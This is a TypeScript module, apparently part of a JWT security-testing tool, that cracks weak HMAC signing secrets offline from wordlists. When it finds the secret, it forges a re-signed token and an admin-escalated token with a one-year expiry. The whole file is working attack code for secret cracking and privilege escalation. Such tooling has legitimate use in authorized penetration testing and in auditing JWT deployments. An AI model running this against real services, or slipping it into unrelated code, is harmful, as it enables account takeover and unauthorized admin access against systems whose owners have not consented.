/**
 * Weak HMAC Secret Brute-Force
 *
 * For HS256/HS384/HS512 tokens: try each word from the built-in wordlist
 * plus any user-supplied wordlist.  Returns one attack result per discovered
 * secret (re-signed with the same secret but elevated claims).
 */

import { signHMAC, verifyHMAC } from "../crypto/jwt.js";
import { WEAK_JWT_SECRETS } from "../wordlist.js";
import { EXTENDED_JWT_SECRETS } from "../wordlist.generated.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

export async function buildWeakSecretAttacks(
  parsed: ParsedJWT,
  config: PluginConfig,
  originalToken: string
): Promise<AttackResult[]> {
  const alg = parsed.header.alg as string;
  if (!alg.startsWith("HS")) return [];

  const hmacAlg = alg as "HS256" | "HS384" | "HS512";
  // Built-in short list + the bundled ~10k extended list + user-supplied words,
  // de-duplicated so each candidate is only tested once.
  const wordlist = [...new Set([...WEAK_JWT_SECRETS, ...EXTENDED_JWT_SECRETS, ...config.customWordlist])];
  const results: AttackResult[] = [];

  // Offline brute force: stop at the first secret that reproduces the original
  // token's signature.
  let matched: string | null = null;
  for (const word of wordlist) {
    if (verifyHMAC(originalToken, Buffer.from(word, "utf8"), hmacAlg)) {
      matched = word;
      break;
    }
  }

  if (matched === null) {
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: "Weak Secret — Not Found",
      description: `JWT secret not found in list of ${wordlist.length} secrets.`,
      modifiedJWT: originalToken,
      timestamp: Date.now(),
      infoOnly: true,
      secretsTested: wordlist.length,
    });
    return results;
  }

  const secret = Buffer.from(matched, "utf8");

  // Re-signed with original claims — confirms the server accepts the cracked key.
  results.push({
    id: nanoid(),
    technique: "weakSecret",
    techniqueName: `Weak Secret Cracked: "${matched}"`,
    description:
      `Cracked the ${hmacAlg} signing secret offline: "${matched}". ` +
      "Re-signs the original claims to confirm the server accepts the cracked key.",
    modifiedJWT: signHMAC(parsed.header, parsed.payload, secret, hmacAlg),
    timestamp: Date.now(),
    hmacSecret: matched,
    secretsTested: wordlist.length,
  });

  // Privilege escalation with the cracked secret.
  const adminPayload = {
    ...parsed.payload,
    role: "admin",
    admin: true,
    is_admin: true,
    exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
  };
  results.push({
    id: nanoid(),
    technique: "weakSecret",
    techniqueName: `Weak Secret — Privilege Escalation ("${matched}")`,
    description:
      `Re-signs with cracked secret "${matched}" and elevated claims ` +
      "(admin=true, role=admin, +1yr exp).",
    modifiedJWT: signHMAC(parsed.header, adminPayload, secret, hmacAlg),
    timestamp: Date.now(),
    hmacSecret: matched,
    secretsTested: wordlist.length,
  });

  return results;
}
